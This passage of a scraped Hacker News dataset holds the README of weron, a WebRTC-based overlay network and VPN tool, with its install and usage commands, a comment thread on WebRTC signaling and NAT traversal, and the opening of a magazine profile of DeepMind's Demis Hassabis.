advantage of your own read only system. It is not changed mostly after all (or all changes only from your good self). reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Running a Raspberry Pi with a read-only root filesystem can extend the lifespan of the SD card by reducing write operations.",
      "The guide offers detailed instructions on various steps, including removing unnecessary software, configuring read-only filesystem, managing programs installed via snap, utilizing tmpfs for RAM data storage, and limiting space used by journald.",
      "It also covers handling errors from processes that might not work correctly on a read-only filesystem, providing a comprehensive approach to optimizing Raspberry Pi performance and efficiency."
    ],
    "commentSummary": [
      "The article explores running a Raspberry Pi with a read-only root filesystem, suggesting SquashFS and EROFS for filesystems.",
      "Users share their experiences with various OS and setups for read-only Pi operation, recommending tools like Alpine Linux.",
      "Recommendations include industrial SD cards, reliable power supplies, and strategies for SD card longevity to avoid data corruption, along with using overlay filesystems like overlayfs with tmpfs for image production."
    ],
    "points": 138,
    "commentCount": 47,
    "retryCount": 0,
    "time": 1711750782
  },
  {
    "id": 39866325,
    "title": "Exploring Werons WebRTC Overlay Networks",
    "originLink": "https://github.com/pojntfx/weron",
    "originBody": "weron Overlay networks based on WebRTC. ⚠ weron has not yet been audited! While we try to make weron as secure as possible, it has not yet undergone a formal security audit by a third party. Please keep this in mind if you use it for security-critical applications. ⚠ Overview weron provides lean, fast & secure overlay networks based on WebRTC. It enables you too ... Access nodes behind NAT: Because weron uses WebRTC to establish connections between nodes, it can easily traverse corporate firewalls and NATs using STUN, or even use a TURN server to tunnel traffic. This can be very useful to for example SSH into your homelab without forwarding any ports on your router. Secure your home network: Due to the relatively low overhead of WebRTC in low-latency networks, weron can be used to secure traffic between nodes in a LAN without a significant performance hit. Join local nodes into a cloud network: If you run for example a Kubernetes cluster with nodes based on cloud instances but also want to join your on-prem nodes into it, you can use weron to create a trusted network. Bypass censorship: The underlying WebRTC suite, which is what popular videoconferencing tools such as Zoom, Teams and Meet are built on, is hard to block on a network level, making it a valuable addition to your toolbox for bypassing state or corporate censorship. Write your own peer-to-peer protocols: The simple API makes writing distributed applications with automatic reconnects, multiple datachannels etc. easy. Installation Containerized You can get the OCI image like so: $ podman pull ghcr.io/pojntfx/weron Natively Static binaries are available on GitHub releases. On Linux, you can install them like so: $ curl -L -o /tmp/weron \"https://github.com/pojntfx/weron/releases/latest/download/weron.linux-$(uname -m)\" $ sudo install /tmp/weron /usr/local/bin $ sudo setcap cap_net_admin+ep /usr/local/bin/weron # This allows rootless execution On macOS, you can use the following: $ curl -L -o /tmp/weron \"https://github.com/pojntfx/weron/releases/latest/download/weron.darwin-$(uname -m)\" $ sudo install /tmp/weron /usr/local/bin On Windows, the following should work (using PowerShell as administrator): PS> Invoke-WebRequest https://github.com/pojntfx/weron/releases/latest/download/weron.windows-x86_64.exe -OutFile \\Windows\\System32\\weron.exe You can find binaries for more operating systems and architectures on GitHub releases. Usage TL;DR: Join a layer 3 (IP) overlay network on the hosted signaling server with sudo weron vpn ip --community mycommunity --password mypassword --key mykey --ips 2001:db8::1/32,192.0.2.1/24 and a layer 2 (Ethernet) overlay network with sudo weron vpn ethernet --community mycommunity --password mypassword --key mykey 1. Start a Signaling Server with weron signaler The signaling server connects peers with each other by exchanging connection information between them. It also manages access to communities through the --password flag of clients and can maintain persistent communities even after all peers have disconnected. While it is possible and reasonably private (in addition to TLS, connection information is encrypted using the --key flag of clients) to use the hosted signaling server at wss://weron.up.railway.app/, hosting it yourself has many benefits, such as lower latency and even better privacy. The signaling server can use an in-process broker with an in-memory database or Redis and PostgreSQL; for production use the latter configuration is strongly recommended, as it allows you to easily scale the signaling server horizontally. This is particularly important if you want to scale your server infrastructure across multiple continents, as intra-cloud backbones usually have lower latency than residential connections, which reduces the amount of time required to connect peers with each other. Expand containerized instructions Expand native instructions It should now be reachable on ws://localhost:1337/. To use it in production, put this signaling server behind a TLS-enabled reverse proxy such as Caddy or Traefik. You may also either want to keep API_PASSWORD empty to disable the management API completely or use OpenID Connect to authenticate instead; for more information, see the signaling server reference. You can also embed the signaling server in your own application using it's Go API. 2. Manage Communities with weron manager While it is possible to create ephemeral communities on a signaling server without any kind of authorization, you probably want to create a persistent community for most applications. Ephemeral communities get created and deleted automatically as clients join or leave, persistent communities will never get deleted automatically. You can manage these communities using the manager CLI. If you want to work on your self-hosted signaling server, first set the remote address: $ export WERON_RADDR='http://localhost:1337/' Next, set the API password using the API_PASSWORD env variable: $ export API_PASSWORD='myapipassword' If you use OIDC to authenticate, you can instead set the API password using goit like so: $ export OIDC_CLIENT_ID='Ab7OLrQibhXUzKHGWYDFieLa2KqZmFzb' OIDC_ISSUER='https://pojntfx.eu.auth0.com/' OIDC_REDIRECT_URL='http://localhost:11337' $ export API_KEY=\"$(goit)\" If we now list the communities, we see that none currently exist: $ weron manager list id,clients,persistent We can create a persistent community using weron create: $ weron manager create --community mycommunity --password mypassword id,clients,persistent mycommunity,0,true It is also possible to delete communities using weron delete, which will also disconnect all joined peers: $ weron manager delete --community mycommunity For more information, see the manager reference. You can also embed the manager in your own application using its Go API. 3. Test the System with weron chat If you want to work on your self-hosted signaling server, first set the remote address: $ export WERON_RADDR='ws://localhost:1337/' The chat is an easy way to test if everything is working correctly. To join a chatroom, run the following: $ weron chat --community mycommunity --password mypassword --key mykey --names user1,user2,user3 --channels one,two,three On another peer, run the following (if your signaling server is public, you can run this anywhere on the planet): $ weron chat --community mycommunity --password mypassword --key mykey --names user1,user2,user3 --channels one,two,three .wss://weron.up.railway.app/ user2! +user1@one +user1@two +user1@three user2> You can now start sending and receiving messages or add new peers to your chatroom to test the network. For more information, see the chat reference. You can also embed the chat in your own application using its Go API. 4. Measure Latency with weron utility latency An insightful metric of your network is its latency, which you can measure with this utility; think of this as ping, but for WebRTC. First, start the latency measurement server like so: $ weron utility latency --community mycommunity --password mypassword --key mykey --server On another peer, launch the client, which should start measuring the latency immediately; press CTRL C to stop it and get the total statistics: $ weron utility latency --community mycommunity --password mypassword --key mykey # ... 128 B written and acknowledged in 110.111µs 128 B written and acknowledged in 386.12µs 128 B written and acknowledged in 310.458µs 128 B written and acknowledged in 335.341µs 128 B written and acknowledged in 264.149µs ^CAverage latency: 281.235µs (5 packets written) Min: 110.111µs Max: 386.12µs For more information, see the latency measurement utility reference. You can also embed the utility in your own application using its Go API. 5. Measure Throughput with weron utility throughput If you want to transfer large amounts of data, your network's throughput is a key characteristic. This utility allows you to measure this metric between two nodes; think of it as iperf, but for WebRTC. First, start the throughput measurement server like so: $ weron utility throughput --community mycommunity --password mypassword --key mykey --server On another peer, launch the client, which should start measuring the throughput immediately; press CTRL C to stop it and get the total statistics: $ weron utility throughput --community mycommunity --password mypassword --key mykey # ... 97.907 MB/s (783.253 Mb/s) (50 MB read in 510.690403ms) 64.844 MB/s (518.755 Mb/s) (50 MB read in 771.076908ms) 103.360 MB/s (826.881 Mb/s) (50 MB read in 483.745832ms) 89.335 MB/s (714.678 Mb/s) (50 MB read in 559.692495ms) 85.582 MB/s (684.657 Mb/s) (50 MB read in 584.233931ms) ^CAverage throughput: 74.295 MB/s (594.359 Mb/s) (250 MB written in 3.364971672s) Min: 64.844 MB/s Max: 103.360 MB/s For more information, see the throughput measurement utility reference. You can also embed the utility in your own application using it's Go API. 6. Create a Layer 3 (IP) Overlay Network with weron vpn ip If you want to join multiple nodes into an overlay network, the IP VPN is the best choice. It works similarly to i.e. Tailscale/WireGuard and can either dynamically allocate an IP address from a CIDR notation or statically assign one for you. On Windows, make sure to install TAP-Windows first. Also note that due to technical limitations, only one IPv4 or IPv6 network and only one VPN instance at a time is supported on Windows; on macOS, only IPv6 networks are supported and IPv4 networks are ignored. To get started, launch the VPN on the first peer: $ sudo weron vpn ip --community mycommunity --password mypassword --key mykey --ips 2001:db8::1/64,192.0.2.1/24 {\"level\":\"info\",\"addr\":\"wss://weron.up.railway.app/\",\"time\":\"2022-05-06T22:20:51+02:00\",\"message\":\"Connecting to signaler\"} {\"level\":\"info\",\"id\":\"[\\\"2001:db8::6a/64\\\",\\\"192.0.2.107/24\\\"]\",\"time\":\"2022-05-06T22:20:56+02:00\",\"message\":\"Connected to signaler\"} On another peer, launch the VPN as well: $ sudo weron vpn ip --community mycommunity --password mypassword --key mykey --ips 2001:db8::1/64,192.0.2.1/24 {\"level\":\"info\",\"addr\":\"wss://weron.up.railway.app/\",\"time\":\"2022-05-06T22:22:30+02:00\",\"message\":\"Connecting to signaler\"} {\"level\":\"info\",\"id\":\"[\\\"2001:db8::b9/64\\\",\\\"192.0.2.186/24\\\"]\",\"time\":\"2022-05-06T22:22:36+02:00\",\"message\":\"Connected to signaler\"} {\"level\":\"info\",\"id\":\"[\\\"2001:db8::6a/64\\\",\\\"192.0.2.107/24\\\"]\",\"time\":\"2022-05-06T22:22:36+02:00\",\"message\":\"Connected to peer\"} You can now communicate between the peers: $ ping 2001:db8::b9 PING 2001:db8::b9(2001:db8::b9) 56 data bytes 64 bytes from 2001:db8::b9: icmp_seq=1 ttl=64 time=1.07 ms 64 bytes from 2001:db8::b9: icmp_seq=2 ttl=64 time=1.36 ms 64 bytes from 2001:db8::b9: icmp_seq=3 ttl=64 time=1.20 ms 64 bytes from 2001:db8::b9: icmp_seq=4 ttl=64 time=1.10 ms ^C --- 2001:db8::b9 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3002ms rtt min/avg/max/mdev = 1.066/1.180/1.361/0.114 ms If you temporarily lose the network connection, the network topology changes etc. it will automatically reconnect. For more information and limitations on proprietary operating systems like macOS, see the IP VPN reference. You can also embed the utility in your own application using its Go API. 7. Create a Layer 2 (Ethernet) Overlay Network with weron vpn ethernet If you want more flexibility or work on non-IP networks, the Ethernet VPN is a good choice. It works similarly to n2n or ZeroTier. Due to API restrictions, this VPN type is not available on macOS; use Asahi Linux, a computer that respects your freedoms or the layer 3 (IP) VPN instead. To get started, launch the VPN on the first peer: $ sudo weron vpn ethernet --community mycommunity --password mypassword --key mykey {\"level\":\"info\",\"addr\":\"wss://weron.up.railway.app/\",\"time\":\"2022-05-06T22:42:10+02:00\",\"message\":\"Connecting to signaler\"} {\"level\":\"info\",\"id\":\"fe:60:a5:8b:81:36\",\"time\":\"2022-05-06T22:42:11+02:00\",\"message\":\"Connected to signaler\"} If you want to add an IP address to the TAP interface, do so with iproute2 or your OS tools: $ sudo ip addr add 192.0.2.1/24 dev tap0 $ sudo ip addr add 2001:db8::1/32 dev tap0 On another peer, launch the VPN as well: $ sudo weron vpn ethernet --community mycommunity --password mypassword --key mykey {\"level\":\"info\",\"addr\":\"wss://weron.up.railway.app/\",\"time\":\"2022-05-06T22:52:56+02:00\",\"message\":\"Connecting to signaler\"} {\"level\":\"info\",\"id\":\"b2:ac:ae:b6:32:8c\",\"time\":\"2022-05-06T22:52:57+02:00\",\"message\":\"Connected to signaler\"} {\"level\":\"info\",\"id\":\"fe:60:a5:8b:81:36\",\"time\":\"2022-05-06T22:52:57+02:00\",\"message\":\"Connected to peer\"} And add the IP addresses: $ sudo ip addr add 192.0.2.2/24 dev tap0 $ sudo ip addr add 2001:db8::2/32 dev tap0 You can now communicate between the peers: $ ping 2001:db8::2 PING 2001:db8::2(2001:db8::2) 56 data bytes 64 bytes from 2001:db8::2: icmp_seq=1 ttl=64 time=1.20 ms 64 bytes from 2001:db8::2: icmp_seq=2 ttl=64 time=1.14 ms 64 bytes from 2001:db8::2: icmp_seq=3 ttl=64 time=1.24 ms ^C --- 2001:db8::2 ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 2002ms rtt min/avg/max/mdev = 1.136/1.193/1.239/0.042 ms If you temporarily lose the network connection, the network topology changes etc. it will automatically reconnect. You can also embed the utility in your own application using its Go API. 8. Write your own protocol with wrtcconn It is almost trivial to build your own distributed applications with weron, similarly to how PeerJS works. Here is the core logic behind a simple echo example: // ... for {select {case id := <-ids: log.Println(\"Connected to signaler\", id)case peer := <-adapter.Accept(): log.Println(\"Connected to peer\", peer.PeerID, \"and channel\", peer.ChannelID) go func() {defer func() { log.Println(\"Disconnected from peer\", peer.PeerID, \"and channel\", peer.ChannelID)}()reader := bufio.NewScanner(peer.Conn)for reader.Scan() { log.Printf(\"%s\", reader.Bytes())} }() go func() {for { if _, err := peer.Conn.Write([]byte(\"Hello!\")); err != nil {return } time.Sleep(time.Second)} }()} } You can either use the minimal adapter or the named adapter; the latter negotiates a username between the peers, while the former does not check for duplicates. For more information, check out the Go API and take a look at the provided examples, utilities and services in the package for examples. 🚀 That's it! We hope you enjoy using weron. Reference Command Line Arguments $ weron --help Overlay networks based on WebRTC. Find more information at: https://github.com/pojntfx/weron Usage: weron [command] Available Commands: chat Chat over the overlay network completion Generate the autocompletion script for the specified shell help Help about any command manager Manage a signaling server signaler Start a signaling server utility Utilities for overlay networks vpn Join virtual private networks built on overlay networks Flags: -h, --help help for weron -v, --verbose int Verbosity level (0 is disabled, default is info, 7 is trace) (default 5) Use \"weron [command] --help\" for more information about a command. Expand subcommand reference Environment Variables All command line arguments described above can also be set using environment variables; for example, to set --max-retries to 300 with an environment variable, use WERON_MAX_RETRIES=300. Acknowledgements songgao/water provides the TUN/TAP device library for weron. pion/webrtc provides the WebRTC functionality. Contributing To contribute, please use the GitHub flow and follow our Code of Conduct. To build and start a development version of weron locally, run the following: $ git clone https://github.com/pojntfx/weron.git $ cd weron $ make depend $ make && sudo make install $ weron signal # Starts the signaling server # In another terminal $ weron chat --raddr ws://localhost:1337 --community mycommunity --password mypassword --key mykey --names user1,user2,user3 --channels one,two,three # In another terminal $ weron chat --raddr ws://localhost:1337 --community mycommunity --password mypassword --key mykey --names user1,user2,user3 --channels one,two,three Of course, you can also contribute to the utilities and VPNs like this. Have any questions or need help? Chat with us on Matrix! License weron (c) 2023 Felicitas Pojtinger and contributors SPDX-License-Identifier: AGPL-3.0",
    "commentLink": "https://news.ycombinator.com/item?id=39866325",
    "commentBody": "Overlay networks based on WebRTC (github.com/pojntfx)138 points by keepamovin 17 hours agohidepastfavorite35 comments dboreham 8 hours agoWebRTC is widely misunderstood. It is not a p2p-enabling technology. It requires a mechanism for passing messages between nodes prior to establishing a session (this is called \"signaling\" in the literature). So it's another turtle layer: it's a scheme for communicating between nodes provided they can already communicate. So why does it exist? Answer: to reduce the cost to provide a service where bulk data flows are p2p. It does this by trying to get said flows over UDP with NAT traversal directly between the host networks for communicating nodes. The canonical example is internet telephony. But it does this on the assumption that there will be a long tail of node pairs for which a hairpin route through a server will be needed. It doesn't remove the need for servers, only the resources needed for those servers. Everyone who says they have built a true p2p system with WebRTC is confused[1]. [1] You can build such a thing with WebRTC, but only if the nodes are not browser hosted and have public IPs. If you think that's useful then you're also confused. reply Sean-Der 8 hours agoparentWhat protocols/networks do you consider P2P? Every P2P technology I have used requires some bootstrapping. I have done WebRTC with zero signaling, but browser only one side[0]. I wish the w3c/ietf would care, but that’s the issue with corporate/profit driven standards! [0] https://github.com/pion/offline-browser-communication reply Uptrenda 3 hours agorootparentBootstrapping is an interesting problem. If there's a large P2P network (think like Gnutella) there's papers that have proposed using port scanning of residential IP ranges to find peers that belong to the network. It's an interesting approach because there's no centralized bootstrapping servers. But, port scanning is inefficient and such an approach may only be viable if a network is large (I may be wrong here.) Still, I think it's cool how little work has been done on these problems. I am still really into p2p networks. For my own project I observed that all of the main networks in some way still depend on trusted introduction points. Just many of them and combined. So I think using infrastructure that's federated and open is a good design (in my case: public MQTT servers is what my own software is based on.) reply halfmatthalfcat 7 hours agoparentprevYou can do offline signaling. Quoting MDN: > It's any sort of channel of communication to exchange information before setting up a connection, whether by email, postcard, or a carrier pigeon. It's up to you. All you need are SDPs and ICE Candidates. People choose a centralized signaling server because it's the easiest but WebRTC does not dictate it be that way. Echoing the other commenter, there really is no other way to establish a connection without some knowledge of the other peer, be it gained online or offline. reply keepamovin 6 hours agorootparentI experimented with implementing this manual signaling where the delay between back and forth could be dozens of seconds or even minutes. I found that you need to call restartIce, which is not typically called in SimplePeer and is not normally exposed. So as it currently stands, SimplePeer regular version that you can get from the package manager will not support signaling over dozens of minutes. It just won't work. But it can be made to work if you just call restart ICE, which keeps everything alive. I discovered this through my own research and experiments. And you can see the code below. And also, you can fork this repo and read the instructions to get a working version as well. I think the original idea was basically you can, like, be in your shell and you can run this repo and then you can be chatting with people who come to your GitHub repository. And, the signaling is done over comments and there’s sort of like a comment robot that facilitates that to make it easy. https://github.com/o0101/janus/ RestartIce: https://github.com/o0101/janus/blob/9b092218b7623ca198c3caef... reply javajosh 4 hours agoparentprevIt's okay to make a distinction between transient and steady-state communications. If the steady-state is p2p then that's good enough for me. BTW I've never built one but I've read that WebRTC can connect browsers on a local LAN if they can see each other's IP address. (This is actually an experiment I'd one day like to do.) reply tptacek 14 hours agoprevI can't tell for sure without actually checking the repo out but this looks to be GCM with random nonces using a command line flag string as the fixed key for the network. If you're trying to build a modern encrypted multipoint overlay network, MLS is a good place to start. reply orion138 11 hours agoparentDid you mean MPLS? Or could you link to MLS? reply akerl_ 10 hours agorootparenthttps://en.wikipedia.org/wiki/Messaging_Layer_Security reply mrkramer 13 hours agoprevWebTorrent[0] is also good WebRTC P2P project. [0] https://en.wikipedia.org/wiki/WebTorrent reply evbogue 12 hours agoparentI recently started using Trystero to send messages and video around via WebRTC. https://oxism.com/trystero/ reply apitman 15 hours agoprevOnto the list[0] it goes. I always have the feeling that WebRTC had so much more potential than has been realized. I wonder how things might have turned out differently if it had better server and browser support ~5 years ago. I remember trying to use it for a game at the time and had trouble finding a good server implementation, and had all sorts of issues with Safari. In the near future I'm not sure there will be much reason to use it over WebTransport, unless you're doing p2p. I actually prefer WebRTC's data channel API, since you can get separate datagram streams, whereas with WebTransport you have to multiplex them yourself[1]. [0]: https://github.com/anderspitman/awesome-tunneling [1]: https://datatracker.ietf.org/doc/html/rfc9221#name-multiplex... reply keepamovin 6 hours agoparentRegarding issues with Safari, they recently made a change where in order to get WebRTC data channels, you no longer had to request get user media permissions. This was the case before. It's still the case on Safari Mobile right now. But you can just say, request mic access, establish the connection, and once it's established, you just drop the mic access. In my case, typically about one to two seconds. So there are indeed quirks on Safari. reply andai 13 hours agoparentprev> had all sorts of issues with Safari Tangential rant, but this appears to be intentional. As far as I can tell, Apple is intentionally lagging behind supporting various web technologies, to make the web as unattractive as possible (within their ecosystem), and by extension, to make native app development as attractive as possible, so they can take a cut of the profits. If their reasoning is correct, then they would actually lose money by not investing into their own browser engine, which is somewhat amusing, because the worse of a job they do, the more money they make. (I find this idea particularly painful in the context of \"we at Apple love web technology so much, we're going to use our love of web as our main excuse for killing Flash\"...) reply keepamovin 5 hours agorootparentNot a great strategy. Can't compare apples and oranges. Long term weakening their web offering will only strengthen their competition and likely have compounding effects against their app store. Maybe it's a short term thing for them. Seems a better way would be to embrace web and create the synergies with their existing offerings that boost both...but, I think this highlights the issue It's not so much about a binary choice between app store vs web. I think it's more just, the web is not very \"Apple\". It's too open, wild. If they go \"all in\" on the web, they'd be afraid to risk \"losing themselves\" or fucking something up and creating a backlash. reply simfree 4 hours agorootparentThis strategy of trying to snuff out web apps by locking all iOS users into a decade out of date fork of Chrome that only gets a trickle of new features, and those features consistently have added UX friction that exists in no other modern borders is working in North America. reply keepamovin 3 hours agorootparentTrue, it works some. But think of what could be done if they could get beyond their, albeit understandable, web aversion. Tho I disagree that Safari is so defunkt as you make out. They have a bunch of new features. Check out: https://webkit.org/blog/15243/release-notes-for-safari-techn... reply billywhizz 13 hours agoparentprevi've long felt the same. i came to conclusion the browser vendors decided it was kind of a mistake. it enables all sorts of local first and p2p things that cut out the service providers. hopefully it will get some attention again. i have done a bunch of really interesting experiments with data channels. being able to choose the reliability is nice for sure. reply treyd 13 hours agorootparent> it enables all sorts of local first and p2p things that cut out the service providers. And this is another reason why the web will always be a shaky foundation for local first and p2p software. reply Sean-Der 13 hours agoparentprevWebRTC will live on. I think it will continue to grow from grassroots efforts. WebRTC has P2P and it also doesn't require the user to have any knowledge of Video/Networking. The alternatives to it are more geared at 'video developers'. I don't know which way the future will go. reply samtheprogram 11 hours agoparentprevAround 5 years ago, peer negotiation got massively simplified with new additions to the spec (see Perfect Negotiation). If you’re on a browser released since then, your life will be far easier. reply xori 16 hours agoprevHyperswarm has been my go-to for stuff like this, but you bring up a good point that I don't think it's encrypted. https://github.com/holepunchto/hyperswarm reply Uptrenda 3 hours agoparentQuite a solid project and approach. Both founders seem smart and to know the problem well. I can see their new framework (Pear runtime) getting huge in the future. reply apitman 15 hours agoparentprevCan hyperswarm be used to set up a generic IP network? reply EGreg 16 hours agoprevGood work! I just want to point out that WebRTC requires servers for STUN and TURN. If I may, we also developed an open source solution for WebRTC videoconferencing, livestreaming and even peer-to-peer broadcasting to unlimited numbers of people! Feel free to use it: https://community.qbix.com/t/teleconferencing-and-live-broad... reply megous 15 hours agoparentIt does not require either of those. reply ongy 15 hours agorootparentNAT traversal is the first point on the feature list of the linked repo. So in context, it's important to point out. While in theory it doesn't it reduces the possible connections quite a bit. Though STUN servers are plenty on the internet and free to use. There's even a service providing TURN (US geo though), but I have no idea who runs it and what their business model is, so I wouldn't rely on it. reply rmdes 15 hours agoprevFelicitas is one of those devs, every repository on her profile is a gem to learn from, and well documented! reply pappapisshu 12 hours agoprevADGT.js [0] was another P2P overlay network based on WebRTC. [0] https://doi.org/10.1002/cpe.4254 reply lostmsu 8 hours agoprevI am actually working on something like this in https://borg.games ( also see https://github.com/BorgGames/borggames.github.io ) Basically the idea is that the only endpoint available through regular HTTPS is the signaling server, and the other services are accessible via WebRTC by requesting peers from the signaling server with service's public key. There are multiple things I am planning to layer over p2p connections: CDN, virtual LANs to play games \"locally\", gameserver hosting, etc reply k__ 14 hours agoprevIs this like web-onion? reply Uptrenda 5 hours agoprev[...] using STUN. I'm convinced no one actually knows what STUN is. I always see these references to STUN in P2P contexts. STUN is just a shitty protocol that shows what your external IP and port is. That's literally it. You can't use it by itself to do any kind of NAT traversal. There is an RFC that lists how to use STUN lookups to enumerate a NAT (but its far from definitive) and anything useful requires looking at other papers about NATs to apply the results. This is what you would need to do before you did hole punching. [...] webrtc. See, the thing about webrtc is: its a vague, low-quality spec. It uses over-simplified descriptions of peers, NATs, and hole punching algorithms, over a design that would provide better reachability. But the approach that webrtc takes is to just fallback to TURN for edge-cases (TURN is a proxy protocol.) The problem with that is it's likely that TURN will be used significantly for things like mobile devices due to symmetric NATs. This means maintaining infrastructure for your 'p2p' system when you don't have to. Overall, I am a fan of the fact that webrtc is in the browser and its 'standardized' but I think that the actual implementation of what its trying to achieve doesn't work well for the real Internet. reply egberts1 13 hours agoprev [–] That's the first thing I disable in all enterprise/office PCs' browser: WebRTC. Disclosure: I am an cybersecurity architect of IDS/NDS/XNS. reply bjconlan 7 hours agoparentI'm curious as to why? Introduce difficulty to promote some ICE holepunching access to the device? reply egberts1 13 hours agoparentprev [–] Meh, WebRTC ... it's not for everyone. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Weron is a WebRTC-based overlay network enabling access to nodes behind NAT, secure home networks, and circumventing censorship, offering a straightforward API for peer-to-peer protocols.",
      "Users can install Weron via containerized OCI images or static binaries, detailing the signaling server usage to connect peers, manage communities, and conducting latency and throughput measurements on the network.",
      "The text covers creating Layer 3 and Layer 2 overlay networks with Werons VPN, establishing a Layer 2 Ethernet overlay network, and crafting custom protocols with wrtcconn, along with guidance on using weron, including command line arguments, environment variables, and licensing details."
    ],
    "commentSummary": [
      "Discussion focuses on WebRTC for peer-to-peer internet communication, mentioning technologies like SimplePeer, GCM, MLS, and WebTorrent, along with challenges in server and browser support.",
      "Speculation arises about Apple's aversion to backing web technologies such as WebTransport and WebRTC, possibly to promote its app store, prompting debates on simplifying peer negotiation and enhancing security through open-source WebRTC video conferencing solutions.",
      "Developers weigh the efficiency of STUN and WebRTC in NAT traversal, raising worries about security and usability in the process."
    ],
    "points": 138,
    "commentCount": 35,
    "retryCount": 0,
    "time": 1711731607
  },
  {
    "id": 39866795,
    "title": "Demis Hassabis: Leading Google's AI Push",
    "originLink": "https://www.bigtechnology.com/p/can-demis-hassabis-save-google",
    "originBody": "Share this post Can Demis Hassabis Save Google? www.bigtechnology.com Copy link Facebook Email Note Other Discover more from Big Technology A newsletter about big tech and society by independent journalist Alex Kantrowitz. Over 164,000 subscribers Subscribe Continue reading Sign in Can Demis Hassabis Save Google? The DeepMind founder has a track record of insane AI breakthroughs. Can he do it within the Google mothership? Alex Kantrowitz Mar 29, 2024 45 Share this post Can Demis Hassabis Save Google? www.bigtechnology.com Copy link Facebook Email Note Other Share Demis Hassabis stares intently through the screen when I ask him whether he can save Google. It’s early evening in his native U.K. and the DeepMind founder is working overtime. His Google-owned AI research house now leads the company’s entire AI research effort, after ingesting Google Brain last summer, and the task ahead is immense. Google’s core business is thriving, but that almost seems beside the point. Hassabis and I are speaking on Google Meet, in an interview arranged via Gmail, scheduled on Google Calendar, and researched via Google Search. Largely thanks to these core products, Google posted $307 billion in revenue last year, growing 13% in the fourth quarter, and is trading near its all-time high. But questions about its ability to win the AI race, or even competently run it, have clouded its recent success. “I don't really see it like that,” Hassabis says, challenging the premise of my question. Artificial intelligence, he says, will “disrupt many, many things. And of course, you want to be on the cutting edge of that, influencing that disruption, rather than on the receiving end.” Subscribe Hassabis is the person who’s supposed to be keeping Google on that cutting edge. The award winning researcher and neuroscientist — who was just knighted on Thursday — has led a dynamic AI team within Google responsible for numerous breakthroughs. Since its 2014 acquisition, DeepMind has cracked a seemingly impossible board game with AlphaGo, decoded protein with AlphaFold, and laid the groundwork for synthesizing thousands of new materials, all via revolutionary AI models. But Hassabis and the combined Google DeepMind team must now translate those types of breakthroughs into tangible product improvements for a $1.8 trillion company seeking a way forward in an increasingly AI world. And he must do it all without killing a search advertising business that serves up the lucrative blue links AI threatens. Late on chatbots, rife with naming confusing, and with an embarrassing image generation fiasco just in the rearview mirror, the path forward won’t be simple. But Hassabis has a chance to fix it. To those who known him, have worked alongside him, and still do — all of whom I’ve spoken with for this story — Hassabis just might be the perfect person for the job. “We're very good at inventing new breakthroughs,” Hassabis tells me. “I think we'll be the ones at the forefront of doing that again in the future.” From Brains to Computers Born in July 1976 to a Chinese-Singaporean mother and Greek Cypriot father, Hassabis began thinking about AI as a boy in North London. A young chess master with professional aspirations, Hassabis noticed at 11 years old that the electronic chess board he’d been training against had some form of intelligence inside, and grew interested in the tech. “I was fascinated by how this lump of plastic was programmed to be able to play chess,” he says. “I started reading some books about it and programming my own little AI games.” After co-creating the hit game Theme Park at age 17, Hassabis went on to study computer science at Cambridge before returning to game development in his 20s. By then, rudimentary AI systems were growing ubiquitous in gaming and Hassabis decided he’d need to understand how the human brain works if he were to make a difference in the field. So he enrolled in a graduate neuroscience program at University College London and then did postdocs at MIT and Harvard. “He was very smart, and in a different way than some of the other smart people I know,” says Tomaso Poggio, an MIT professor, computational neuroscience pioneer, and postdoc advisor to Hassabis. “It's not that he is technically a magician, in any one area — well, maybe chess — but he’s broadly smart about everything you can speak of. And it's very convincing, without any effort.” One night, Poggio hosted Hassabis for dinner, and his student had an idea brewing for a new company that would employ lessons from neuroscience to advance the state of AI. Artificial brains could work similar to humans, he believed. And games could simulate real world environments, an ideal training ground. After the dinner, Poggio asked his wife if they should invest in Hassabis’s new company and, having just met him, she told him to get in. Poggio became one of DeepMind’s earliest investors, though he wishes he’d given more cash to Hassabis. “It was a good thing to do. Unfortunately, it was not enough money,” he says. In DeepMind’s early days, Hassabis executed the vision by running AI agents through game simulations. In doing so, he helped advance reinforcement learning, a type of AI training where you run a bot with zero instruction, giving it countless opportunities to fail so eventually it learns what it needs to do to win. “They had an agent playing all the Atari Games,” says Tejas Kulkarni, an AI researcher who worked at DeepMind and is now CEO of AI startup Common Sense Machines. “This was the first time that deep reinforcement learning proved itself. It was like, holy shit. This is the place to be. Everyone's flocked there, including me.” Get 20% off for 1 year If Atari was an appetizer, AlphaGo was the main course. Go is a board game with more playable combinations than atoms in the universe, an “Everest” of AI as Hassabis calls it. In March 2016, DeepMind’s AlphaGo — a program that combined reinforcement learning and deep learning (another AI method) — beat Go grandmaster Lee Sedol, four games to one, over seven days. It was a watershed moment for AI, showing that with enough computing power and the right algorithm, an AI could learn, get a feel for its environment, plan, reason, and even be creative. To those involved, the win made achieving artificial general intelligence — AI on par with human intelligence — feel tangible for the first time. “That was pure magic, says Kulkarni of the Go win. “That was the moment where people were like, okay, AGI is coming now.” “We've always had this 20 year plan from the start of DeepMind,” says Hassabis, when asked about AGI. “I think we're on track, but I feel like that was a huge milestone that we knew what needed to be crossed.” Enter OpenAI As DeepMind rejoiced, a serious challenge brewed beneath its nose. Elon Musk and Sam Altman founded OpenAI in 2015, and despite plenty of internal drama, the organization began working on text generation. Ironically, a breakthrough within Google — called the transformer model — led to the real leap. OpenAI used transformers to build its GPT models, which eventually powered ChatGPT. Its generative ‘large language’ models employed a form of training called “self-supervised learning,” focused on predicting patterns, and not understanding their environments, as AlphaGo did. OpenAI’s generative models were clueless about the physical world they inhabited, making them a dubious path toward human level intelligence, but would still become extremely powerful. Within DeepMind, generative models weren’t taken seriously enough, according to those inside, perhaps because they didn’t align with Hassabis’s AGI priority, and weren’t close to reinforcement learning. Whatever the rationale, DeepMind fell behind in a key area. “We’ve always had amazing frontier work on self-supervised and deep learning,” Hassabis tells me. “But maybe the engineering and scaling component — that we could’ve done harder and earlier. And obviously we’re doing that completely now.” Kulkarni, the ex-DeepMind engineer, believes generative models were not respected at the time across the AI field, and simply hadn’t show enough promise to merit investment. “Someone taking the counter-bet had to pursue that path,’ he says. “That’s what OpenAI did.” As OpenAI worked on the counterbet, DeepMind and its AI research counterpart within Google, Google Brain, struggled to communicate. Multiple ex-DeepMind employees tell me their division had a sense of superiority. And it also worked to wall itself off from the Google mothership, perhaps because 